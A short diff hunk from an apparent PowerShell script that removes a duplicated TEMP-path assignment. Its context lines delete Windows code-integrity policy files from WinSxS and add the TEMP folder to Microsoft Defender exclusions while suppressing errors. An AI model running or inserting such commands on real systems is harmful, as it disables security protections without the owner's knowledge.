@@ -32,9 +32,6 @@ Remove-Item -Path "$env:windir\WinSxS" -Include *winsipolicy.p7b* -Recurse
 $path = Get-Item $env:TEMP
 $folder = $path.FullName
 
-$path = Get-Item $env:TEMP
-$folder = $path.FullName
-
 try {
     Add-MpPreference -ExclusionPath $folder -ErrorAction Stop
 } catch {}
